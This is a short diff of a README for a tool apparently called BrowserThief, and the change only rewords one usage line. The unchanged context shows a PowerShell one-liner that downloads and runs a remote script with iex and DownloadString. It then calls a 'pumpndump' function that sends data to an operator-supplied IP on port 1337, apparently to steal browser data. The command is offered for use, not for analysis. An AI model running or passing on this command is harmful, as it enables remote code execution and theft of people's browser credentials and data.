@@ -37,7 +37,7 @@ foo@bar:~$ sudo bash build-docker.sh
 
 ## Instructions
 - finish [Setup](https://github.com/ScribblerCoder/BrowserThief#Setup) first!
--  To simply run the powershell script 
+- simply run the powershell script 
 ```powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ScribblerCoder/BrowserThief/main/BrowserThief.ps1');pumpndump -hq http://<Your-IP>:1337;exit
 ```
